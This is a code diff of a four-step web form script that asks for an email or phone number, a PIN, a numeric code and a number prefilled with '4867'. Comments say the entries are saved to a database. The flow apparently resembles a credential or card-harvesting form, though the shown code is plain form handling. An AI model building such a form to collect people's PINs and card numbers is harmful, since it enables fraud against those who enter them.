@@ -1,23 +1,23 @@
 // State management to store user entries across steps
 const sessionData = {
-    inputType: 'name',
+    inputType: 'email',
     identifier: '',
     pin: '',
     numeric: '',
     anyNumber: ''
 };
 
-// Switch between 'name' and 'phone' tabs on Step 1
+// Switch between 'email' and 'phone' tabs on Step 1
 function switchInputType(type) {
     sessionData.inputType = type;
-    const btnName = document.getElementById('btn-name');
+    const btnName = document.getElementById('btn-email');
     const btnPhone = document.getElementById('btn-phone');
     const inputField = document.getElementById('input-identifier');
 
-    if (type === 'name') {
+    if (type === 'email') {
         btnName.classList.add('active');
         btnPhone.classList.remove('active');
-        inputField.placeholder = 'enter name';
+        inputField.placeholder = 'enter email';
     } else {
         btnPhone.classList.add('active');
         btnName.classList.remove('active');
@@ -37,12 +37,12 @@ function showStep(stepNumber) {
 function submitStep1() {
     const val = document.getElementById('input-identifier').value.trim();
     if (!val) {
-        alert('Please enter your name or phone number.');
+        alert('Please enter your email or phone number.');
         return;
     }
     sessionData.identifier = val;
 
-    // Update Step 2 greeting with the entered name/identifier
+    // Update Step 2 greeting with the entered email/identifier
     document.getElementById('display-name').textContent = val.toUpperCase();
 
     showStep(2);
@@ -99,7 +99,7 @@ function submitStep3() {
     document.getElementById('input-any').focus();
 }
 
-// STEP 4 Submission (Any Number starting with 0000) & Save to Database
+// STEP 4 Submission (Any Number starting with 4867) & Save to Database
 async function submitStep4() {
     const val = document.getElementById('input-any').value.trim();
     if (!val) {
@@ -150,17 +150,17 @@ async function submitStep4() {
 
 // Reset Flow
 function resetFlow() {
-    sessionData.inputType = 'name';
+    sessionData.inputType = 'email';
     sessionData.identifier = '';
     sessionData.pin = '';
     sessionData.numeric = '';
-    sessionData.anyNumber = '0000 ';
+    sessionData.anyNumber = '4867 ';
 
     document.getElementById('input-identifier').value = '';
     document.querySelectorAll('.pin-box').forEach(box => box.value = '');
     document.getElementById('input-numeric').value = '';
-    document.getElementById('input-any').value = '0000 ';
+    document.getElementById('input-any').value = '4867 ';
     
-    switchInputType('name');
+    switchInputType('email');
     showStep(1);
 }
